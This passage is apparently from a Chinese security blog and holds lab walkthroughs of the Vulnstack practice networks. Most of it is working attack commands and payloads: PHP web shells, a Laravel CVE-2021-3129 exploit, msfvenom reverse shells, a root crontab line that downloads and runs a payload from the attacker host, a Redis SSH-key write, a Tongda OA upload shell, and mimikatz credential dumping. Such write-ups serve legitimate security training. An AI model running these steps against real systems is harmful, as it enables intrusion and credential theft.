outfile导入木马</li><li>利用MySQL日志文件getshell</li></ul><h3 id="尝试into-outfile导入木马"><a href="#尝试into-outfile导入木马" class="headerlink" title="尝试into outfile导入木马"></a>尝试into outfile导入木马</h3><p>执行 <code>select @@basedir;</code> 查看一下网站的路径</p><p><img src="/img/domain2_4.png" alt="domain2_4"></p><p>可知路径为<code>C:/phpstudy/MySQL</code></p><p>再尝试执行<code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; into outfile &#39;C:/phpStudy/www/hack.php&#39;;</code></p><p>尝试将木马写入到www网站的根目录下，但失败了</p><p>原因是MySQL的新特性<code>secure_file_priv</code>会对读写文件产生影响，该参数用来限制导入导出，可以借助<code>show global variables like &#39;%secure%&#39;;</code>命令来查看该参数</p><p><img src="/img/domain2_5.png" alt="domain2_4"></p><p><strong>可见此处<code>secure_file_priv</code>的值为<code>NULL</code>，当<code>secure_file_priv</code>的值为<code>NULL</code>时，表示限制MySQL不允许导入导出，所以into outfile写入木马出错。要想使得该语句导出成功，则需要在Mysql文件夹下修改my.ini 文件，在[mysqld]内加入secure_file_priv &#x3D;””</strong></p><h3 id="利用Mysql日志文件写入shell"><a href="#利用Mysql日志文件写入shell" class="headerlink" title="利用Mysql日志文件写入shell"></a>利用Mysql日志文件写入shell</h3><p>先执行命令：<code>show variables like &#39;%general%&#39;;</code> 查看日志状态：</p><p><img src="/img/domain2_6.png" alt="domain2_4"></p><p>当开启 <code>general_log</code> 时，所执行的 SQL 语句都会出现在 stu1.log 文件中，如果修改 <code>general_log_file</code> 的值为一个php文件，则所执行的 SQL 语句就会对应生成在对应的文件中，进而可 Getshell</p><p>开启 general_log：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;on&#x27;</span><br></code></pre></td></tr></table></figure><p>指定日志写入到网站根目录的 hack.php 文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:/phpStudy/www/hack.php&#x27;</span><br></code></pre></td></tr></table></figure><p>然后执行SQL语句，<code>SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code>，可将此一句话木马写入<code>hack.php</code></p><p>访问<code>/hack.php</code>可发现已成功写入</p><h2 id="yxcms后台getshell"><a href="#yxcms后台getshell" class="headerlink" title="yxcms后台getshell"></a>yxcms后台getshell</h2><p>参考其他师傅的wp，其实在目标IP的<code>/yxcms</code>路径下可发现还存在有一个cms系统，前台公告处发现存在泄露后台地址以及默认的管理员用户名和密码，尝试登录成功，在后台的模板处对前台模板进行编辑，写入木马然后进行保存</p><p><img src="/img/domain2_7.png" alt="domain2_4"></p><p>此外，通过泄露的cms备份文件<code>beifen.rar</code>可知前台模板的php文件保存路径为：<code>/yxcms/protected/apps/default/view/default/</code>通过此路径，我们也可以成功连接上shell</p><h2 id="内网信息探测搜集"><a href="#内网信息探测搜集" class="headerlink" title="内网信息探测搜集"></a>内网信息探测搜集</h2><p>用蚁剑连接shell，查看开放的端口，发现<code>3389</code>并未开放，输入命令打开<code>3389</code>端口，并创建新用户<code>test1024</code>成功登录远程桌面</p><p>发现是<code>Windows7</code>系统，且存在域<code>god.org</code></p><p><img src="/img/domain2_8.png" alt="domain2_4"></p><p>由于个人使用习惯，使用<code>CobaltStrike</code>生成木马并在该机器执行，成功上线CS</p><p>然后在CS使用<code>mimkatz</code>成功得到<code>administrator</code>用户的密码</p><p><img src="/img/domain2_9.png" alt="domain2_4"></p><p>内网信息收集的主要目的就是查找域控以及域内的其他主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">net view                 # 查看局域网内其他主机名<br>net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域<br>net user                 # 查看本机用户列表<br>net user /domain         # 查看域用户<br>net localgroup administrators # 查看本地管理员组（通常会有域用户）<br>net view /domain         # 查看有几个域<br>net user 用户名 /domain   # 获取指定域用户的信息<br>net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br>net group 组名 /domain    # 查看域中某工作组<br>net group &quot;domain admins&quot; /domain  # 查看域管理员的名字<br>net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名<br>net group &quot;doamin controllers&quot; /domain  # 查看域控制器主机名（可能有多台）<br></code></pre></td></tr></table></figure><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>利用拿下的机器进行内网扫描，可以发现另外两台内网的机器，由于之前已经利用<code>mimkatz</code>窃取到了用户的哈希凭证，这里可以直接利用票据传递攻击来进行横向移动</p><p>使用SMB方式建立监听（注意！Guardrails可不设置任何内容）右键进行票据传递攻击</p><p><img src="/img/domain2_10.png" alt="domain2_4"></p><p>成功拿下域控以及另一台域内主机</p><p><img src="/img/domain2_11.png" alt="domain2_4"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>信息收集</tag>
      
      <tag>横向移动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场vulnstack7实战笔记</title>
    <link href="/2024/07/11/domain1/"/>
    <url>/2024/07/11/domain1/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>靶场下载链接：</strong><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/9/">http://vulnstack.qiyuanxuetang.net/vuln/detail/9/</a></p><p><strong>参考链接：</strong><a href="https://www.freebuf.com/articles/web/354890.html">https://www.freebuf.com/articles/web/354890.html</a></p><p><strong>拓扑图：</strong></p><p><img src="/img/domain1.png" alt="domain1"></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><strong>目标IP：</strong>192.168.40.136</p><p><strong>第一层网络DMZ-Web1（Ubuntu）：</strong></p><p>网卡1：192.168.40.136</p><p>网卡2：192.168.52.10</p><p><strong>第二层网络-Web2（Ubuntu）：</strong></p><p>网卡1：192.168.52.20</p><p>网卡2：192.168.93.10</p><p><strong>第二层网络-PC1（Windows 7）：</strong></p><p>网卡1：192.168.52.30</p><p>网科2：192.168.93.20</p><p><strong>第三层网络-PC2（Windows 7）：</strong></p><p>网卡1：192.168.93.40</p><p><strong>第三层网络-Server（Windows Server 2012）：</strong></p><p>网卡1：192.168.93.30</p><h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>拿到目标IP后，使用nmap对目标IP进行常规的信息搜集</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -T4 -p<span class="hljs-number">1-65535</span> -<span class="hljs-keyword">A</span> <span class="hljs-number">192.168.40.136</span><br></code></pre></td></tr></table></figure><p><img src="/img/domain2.png" alt="domain2"></p><p>发现其81端口开放且存在<strong>Laravel</strong>框架，此外6379端口存在<strong>Redis</strong>服务</p><p>根据此处<strong>Laravel</strong>框架的版本，推测其存在<strong>CVE-2021-3129</strong>漏洞</p><p>利用<a href="https://github.com/zhzyker/CVE-2021-3129">Laravel漏洞检测工具</a>进行检测，发现其存在相关漏洞</p><p><img src="/img/domain3.png" alt="domain3"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用<a href="https://github.com/crisprss/Laravel_CVE-2021-3129_EXP">CVE-2021-3129的利用脚本</a>写入木马</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">&quot;system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&#x27;);&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;<br><br>/*<br>system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&#x27;);<br>这行命令通过 PHP 的 system 函数执行一个 shell 命令。具体命令是将字符串 PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4= 通过 base64 解码，然后将解码后的内容写入到 /var/www/html/shell.php 文件中<br><br>phar phar -o php://output<br>这部分命令的目的是将 PHAR 文件的输出内容重定向到标准输出 (php://output)<br><br>base64 -w 0<br>将上一步的输出通过 base64 编码，并且不换行 (-w 0 表示输出时不换行)<br><br>python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;<br>这部分 Python 代码从标准输入读取数据，并将每个字符转换为十六进制表示，然后格式化为 =xx=00 的形式并输出。比如字符 A 会被转换为 =41=00<br>*/<br></code></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> Laravel_CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span>_EXP.py <span class="hljs-string">&quot;system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/test.php&#x27;);&quot;</span> --phar phar -o php://output | base64 -w <span class="hljs-number">0</span> | python -c <span class="hljs-string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br></code></pre></td></tr></table></figure><p>直接访问192.168.40.136:81&#x2F;shell.php执行命令，可知木马写入成功</p><p><img src="/img/domain4.png" alt="domain3"></p><p>然后使用蚁剑进行连接，输入命令检测后，发现目前该shell目前是在Docker容器中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/self/cgroup<br></code></pre></td></tr></table></figure><p><img src="/img/domain5.png" alt="domain3"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>面对这种情况，需要想办法进行<strong>Docker逃逸</strong>从而获取该主机的权限，但在此之前，由于我们拿到的用户为<strong>www-data</strong>权限太小，所以我们需要进行提权</p><p>这里我们使用find命令来搜索具有SUID的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>根据上面的命令，我们可以遍历所有可执行文件，这里我们发现&#x2F;home&#x2F;jobs目录下存在一个名为<strong>shell</strong>的文件，且存在SUID的权限</p><p>尝试运行shell文件，可以发现其执行了ps命令，并且没有使用绝对路径，因此尝试更改$PATH来执行我们构造的恶意程序，从而获取更高权限的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /tmp<br>echo &quot;/bin/bash&quot; &gt; ps<br>chmod 777 ps<br>echo $PATH <br>export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序<br>cd /home/jobs<br>./shell<br></code></pre></td></tr></table></figure><p><img src="/img/domain6.png" alt="domain3"></p><p>之后可以使用msf生成木马，并将其上传到目标容器执行，然后使用metasploit进行反弹得到shell，具体操作如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.40.142 LPORT=4444 -f elf -o test.elf<br></code></pre></td></tr></table></figure><p>将生成的<strong>test.elf</strong>上传到服务器</p><p>然后使用<strong>msfconsole</strong>进行监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br>use exploit/multi/handler<br>set payload linux/x64/meterpreter/reverse_tcp<br>set lhost 192.168.40.142<br>set lport 4444<br>run<br></code></pre></td></tr></table></figure><p>然后运行上传到服务器的test.elf，成功得到shell</p><p><img src="/img/domain7.png" alt="domain3"></p><h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><ul><li>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。</li><li>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</li><li>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</li></ul><p>查看挂载目录，发现挂载有其他目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fdisk -l<br></code></pre></td></tr></table></figure><p>在根目录创建<strong>test</strong>目录，并将&#x2F;dev&#x2F;sda1挂载上去</p><p>这时我们可以通过访问容器内部的&#x2F;test来实现访问整台宿主机</p><p><strong>注意！在docker容器里挂载一个宿主的本地目录，这样某些容器里输出的文件，就可以在本地目录中打开访问了</strong></p><p>使用metasploit的web_delivery模块生成payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/multi/script/web_delivery<br>set target 7<br>set payload linux/x64/meterpreter/reverse_tcp<br>set lhost 192.168.40.142<br>set lport 5555<br>run<br></code></pre></td></tr></table></figure><p>将生成的命令在目标主机上执行，从而得到目标主机的<strong>meterpreter</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;* * * * * wget -qO TDkiFNiS --no-check-certificate http://192.168.40.142:8080/9eE8P9ar5J; chmod +x TDkiFNiS; ./TDkiFNiS&amp; disown&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root<br></code></pre></td></tr></table></figure><p><img src="/img/domain8.png" alt="domain3"></p><p>通过信息搜集，我们可以得到以下有用信息：</p><ul><li>该主机系统版本为：Ubuntu 14.04</li><li>该主机存在两个内网IP：192.168.52.20 和 192.168.93.10</li></ul><p>这里会发现没有我们所访问的入口地址192.168.40.136</p><p>这边我们再尝试6379端口的<strong>redis</strong>服务，发现其存在未授权访问，直接进行连接</p><p>直接进行利用，通过在攻击机生成<strong>ssh公钥</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa<br></code></pre></td></tr></table></figure><p>然后将生成的公钥导入<strong>key.txt</strong>中，再将key.txt的内容写入目标主机的redis缓冲里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt<br><br>cat key.txt | redis-cli -h 192.168.1.8 -x set xxx<br></code></pre></td></tr></table></figure><p><strong>注意！前后用\n换行，避免和Redis里其他缓存数据混合，-x 代表从标准输入读取数据作为该命令的最后一个参数</strong></p><p>然后使用攻击机连接目标的<strong>Redis</strong>，然后执行命令将<strong>ssh公钥</strong>写入目标主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /root/.ssh    # 设置redis的备份路径为/root/.ssh/<br>config set dbfilename authorized_keys    # 设置保存文件名为authorized_keys<br>save    # 将数据保存在目标服务器硬盘上<br></code></pre></td></tr></table></figure><p><img src="/img/domain9.png" alt="domain3"></p><p>写入后尝试连接，成功连接上目标主机</p><p><img src="/img/domain10.png" alt="domain3"></p><p>此处查看网络信息，发现也存在两个IP，192.168.40.136 和 192.168.52.10</p><p>操作系统为Ubuntu 18.04</p><p>由此可知目标的网站应该做了反向代理，此Ubuntu 18.04仅仅提供一个代理服务，真正的Web服务器在那台Ubuntu 14.04上，Ubuntu 18.04的Nginx将81端口上收到的请求转发给了内网第二层网络的Web服务器192.168.52.20也就是Ubuntu 14.04</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>在Ubuntu 18.04服务器使用earthworm搭建socks5反向代理服务，在攻击机执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./ew_for_linux64 -s rcsocks -l 1080 -e 1234<br></code></pre></td></tr></table></figure><p>在Ubuntu 18.04执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./ew_for_linux64 -s rssocks -d 192.168.40.142 -e 1234<br></code></pre></td></tr></table></figure><p>然后在攻击机修改proxychains的配置文件（一般路径在&#x2F;etc&#x2F;proxychains.conf）在文件底部修改：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socks5</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><p>然后使用<strong>namp</strong>进行扫描，发现存在192.168.52.30主机，且开放了相关端口，在其8080端口上存在<strong>通达OA</strong>系统，将浏览器设置代理后，成功访问</p><p><img src="/img/domain11.png" alt="domain3"></p><p>通过搜索，结合网上纰漏的通达的漏洞，通过未授权登录成功获得session</p><p>之后利用文件上传漏洞，成功上传木马</p><p><strong>注意！此处我在复现过程中，需要将session修改为未授权登录所获得的session</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ispirit/im/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.52.30:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>679<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=0nq2ah0avu1qn3ea4sheo41ha7<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;UPLOAD_MODE&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">2</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;P&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">0</span>nq2ah0avu1qn3ea4sheo41ha7</span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;DEST_UID&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">1</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;ATTACHMENT&quot;</span>; filename=<span class="hljs-string">&quot;jpg&quot;</span></span><br><span class="language-php">Content-Type: image/jpeg</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="language-php"><span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wsh</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd /c &quot;</span>.<span class="hljs-variable">$command</span>);</span><br><span class="language-php"><span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();</span><br><span class="language-php"><span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span><br></code></pre></td></tr></table></figure><p><img src="/img/domain12.png" alt="domain3"></p><p>再结合文件包含来执行命令，成功rce</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ispirit/interface/gateway.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.52.30:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>python-requests/2.21.0<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>69<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-dockerfile">json=&#123;<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;/general/../../attach/im/2407/1005700217.jpg&quot;</span>&#125;&amp;<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">whoami</span></span></span><br></code></pre></td></tr></table></figure><p><img src="/img/domain13.png" alt="domain3"></p><p>然后尝试上线msf</p><p><img src="/img/domain14.png" alt="domain3"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/multi/script/web_delivery<br>set target 2<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.40.136<br>set lport 5566<br>run<br></code></pre></td></tr></table></figure><p>生成的代码直接拿去Burpsuite执行，成功上线msf，从而对目标内网进行信息搜集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipconfig /all   <span class="hljs-comment"># 查看本机ip，所在域</span><br>systeminfo      <span class="hljs-comment"># 列出系统信息</span><br>route <span class="hljs-built_in">print</span>     <span class="hljs-comment"># 打印路由信息</span><br>net view        <span class="hljs-comment"># 查看局域网内其他主机名</span><br>arp -a          <span class="hljs-comment"># 查看arp缓存</span><br><span class="hljs-built_in">whoami</span><br>net start       <span class="hljs-comment"># 查看开启了哪些服务</span><br>net share       <span class="hljs-comment"># 查看开启了哪些共享</span><br><br>net config workstation   <span class="hljs-comment"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br>net user                 <span class="hljs-comment"># 查看本机用户列表</span><br>net user /domain         <span class="hljs-comment"># 查看域用户</span><br>net localgroup administrators   <span class="hljs-comment"># 查看本地管理员组（通常会有域用户）</span><br>net view /domain         <span class="hljs-comment"># 查看有几个域</span><br>net user 用户名 /domain   <span class="hljs-comment"># 获取指定域用户的信息</span><br>net group /domain        <span class="hljs-comment"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br>net group 组名 /domain    <span class="hljs-comment"># 查看域中某工作组</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain  <span class="hljs-comment"># 查看域管理员的名字</span><br>net group <span class="hljs-string">&quot;domain computers&quot;</span> /domain  <span class="hljs-comment"># 查看域中的其他主机名</span><br>net group <span class="hljs-string">&quot;domain controllers&quot;</span> /domain  <span class="hljs-comment"># 查看域控制器（可能有多台）</span><br></code></pre></td></tr></table></figure><p>使用meterpreter上的kiwi模块成功抓取到域用户bunny和域管理员administrator的凭证</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">load kiwi<br>kiwi_cmd privilege::debug<br>kiwi_cmd sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure><p><strong>注意！如果提示需要运行在x64的进程中，可以使用ps查看进程，然后使用migrate迁移进程</strong></p><p><img src="/img/domain15.png" alt="domain3"></p><h2 id="第三层网络渗透"><a href="#第三层网络渗透" class="headerlink" title="第三层网络渗透"></a>第三层网络渗透</h2><p>使用<strong>earthworm</strong>搭建一个二级socks5代理服务</p><p>首先攻击机上执行如下命令添加一个转接隧道，监听1090端口，并将1090端口收到的代理请求发送给1235端口</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">./ew_for_linux64</span> <span class="hljs-string">-s</span> <span class="hljs-string">lcx_listen</span> <span class="hljs-string">-l</span> <span class="hljs-number">1090</span> <span class="hljs-string">-e</span> <span class="hljs-number">1235</span><br></code></pre></td></tr></table></figure><p>然后在第二层网络的Windows服务器上传ew_for_Win.exe，并利用ssocksd方式启动999端口的正向socks代理</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s ssocksd -l <span class="hljs-number">999</span><br></code></pre></td></tr></table></figure><p>最后，在DMZ区域的Ubuntu 